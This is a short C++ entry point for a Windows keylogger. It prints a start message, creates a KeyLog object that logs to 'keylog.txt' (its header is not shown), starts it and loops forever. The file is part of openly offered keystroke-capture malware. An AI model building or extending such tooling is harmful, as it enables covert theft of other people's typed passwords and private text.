#include <iostream>
#include <windows.h>

#include "KeyLog.h"

int main() {
    std::cout << "Keylogger Starting" << std::endl;

  KeyLog keylogger( "keylog.txt");
  keylogger.start();
  // keeping the thread active
  while (true) {
    // Sleep for 100ms
    Sleep(100);
  }
  return 0;
}
